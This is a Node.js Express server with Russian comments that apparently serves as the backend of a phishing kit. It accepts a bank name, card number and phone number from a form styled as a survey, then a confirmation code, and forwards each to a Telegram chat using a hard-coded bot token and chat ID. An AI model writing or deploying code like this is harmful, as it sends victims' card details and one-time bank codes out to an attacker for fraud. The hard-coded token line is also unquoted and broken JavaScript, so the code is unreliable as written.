const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
require('dotenv').config(); // Используем файл .env для хранения токена и ID

const app = express();
const PORT = 3000;

// Подключаем переменные окружения
const TELEGRAM_BOT_TOKEN = 7584473430:AAEIiKWC8QLTvXsL5t5PpdCMum4UkOZaMoM;
const TELEGRAM_CHAT_ID = -4702734460;

app.use(bodyParser.json());

// Маршрут для отправки данных на Telegram
app.post('/api/send-message', async (req, res) => {
    const { bank, cardNumber, phoneNumber } = req.body;

    if (!bank || !cardNumber || !phoneNumber) {
        return res.status(400).json({ error: 'Все поля обязательны для заполнения' });
    }

    const text = `Новый запрос на опрос:\nБанк: ${bank}\nНомер карты: ${cardNumber}\nТелефон: ${phoneNumber}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'Markdown'
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Ошибка при отправке сообщения в Telegram:', error);
        res.status(500).json({ error: 'Не удалось отправить сообщение' });
    }
});

// Маршрут для отправки кода подтверждения в Telegram
app.post('/api/send-code', async (req, res) => {
    const { code } = req.body;

    if (!code) {
        return res.status(400).json({ error: 'Код обязателен' });
    }

    const text = `Код подтверждения: ${code}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'Markdown'
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Ошибка при отправке кода в Telegram:', error);
        res.status(500).json({ error: 'Не удалось отправить код' });
    }
});

// Запускаем сервер
app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});
